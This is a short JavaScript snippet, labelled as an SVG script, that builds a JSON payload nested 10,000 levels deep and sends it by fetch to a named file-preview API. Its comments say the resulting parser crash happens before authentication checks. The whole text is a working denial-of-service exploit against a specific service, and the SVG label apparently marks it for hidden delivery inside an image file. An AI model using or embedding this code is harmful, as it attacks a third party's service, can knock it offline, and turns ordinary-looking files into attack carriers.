svg.script:

// Construct a 10,000-level deeply nested JSON object
const depth = 10000;
let payload = '{"url": "http://example.com", "user_data": ';
payload += '{"n": '.repeat(depth);
payload += '1';
payload += '}'.repeat(depth);
payload += '}';

// Send the payload to the core API
// This bypasses auth because the JSON parsing crash occurs at the middleware 
// layer before authentication validation can reject the request.
fetch('https://api.filepreviews.io/v2/previews/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: payload,
    mode: 'no-cors'
});
